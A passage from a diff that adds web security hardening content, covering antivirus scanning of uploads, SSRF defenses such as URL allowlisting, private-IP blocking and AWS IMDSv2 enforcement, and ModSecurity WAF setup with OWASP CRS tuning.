+result = subprocess.run(['clamdscan', '--no-summary', full_path], capture_output=True)
+if result.returncode != 0:
+    os.remove(full_path)
+    raise ValueError("File failed antivirus scan")</code></pre>
+
+<h3>SSRF Prevention</h3>
+<pre><code># Allowlist-based URL validation (most reliable approach):
+ALLOWED_DOMAINS = {'api.trusted-service.com', 'cdn.example.com'}
+
+def validate_url(url):
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    if parsed.scheme not in ('http', 'https'):
+        raise ValueError("Only HTTP/HTTPS allowed")
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        raise ValueError(f"Domain not in allowlist: {parsed.hostname}")
+    return url
+
+# Block private IP ranges at HTTP client level:
+import ipaddress, socket
+def is_safe_host(hostname):
+    try:
+        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
+        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved)
+    except (ValueError, socket.gaierror):
+        return False
+
+# AWS: Enforce IMDSv2 (blocks SSRF — requires PUT before GET):
+aws ec2 modify-instance-metadata-options \
+  --http-tokens required \
+  --http-endpoint enabled \
+  --instance-id i-xxxxxxxxxxxxxxxxx
+# IMDSv2 requires a PUT request to get a session token before any GET
+# Simple GET-based SSRF cannot obtain the token — cannot access metadata</code></pre>
+
+<h3>WAF Deployment: ModSecurity with OWASP CRS</h3>
+<pre><code># Install ModSecurity and OWASP Core Rule Set:
+apt install libapache2-mod-security2
+git clone https://github.com/coreruleset/coreruleset /etc/modsecurity/crs
+
+# /etc/modsecurity/modsecurity.conf:
+SecRuleEngine On          # Enforce rules (not just detect)
+SecRequestBodyAccess On
+SecResponseBodyAccess On
+SecDefaultAction "phase:2,deny,status:403,log"
+
+# CRS paranoia levels (1-4):
+# Level 1: low false positives, fewer catches — start here in production
+# Level 2: moderate balance — good for most applications
+# Level 3: strict — may require application-specific tuning
+# Level 4: maximum — expects significant tuning effort
+
+SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"
+
+# WAF tuning: add exceptions for legitimate traffic triggering false positives:
+# Rule 942100 may fire on SQL keywords in legitimate search queries
+# Add exception for specific URI:
+SecRule REQUEST_URI "@beginsWith /search" \
+  "id:1000,phase:1,nolog,pass,ctl:ruleRemoveById=942100"
+
+# Important: WAF is defense-in-depth, not the primary control.
+# A determined attacker finds WAF bypass encodings.
+# Parameterized queries and output encoding are the primary defenses.</code></pre>
+`,
+  },
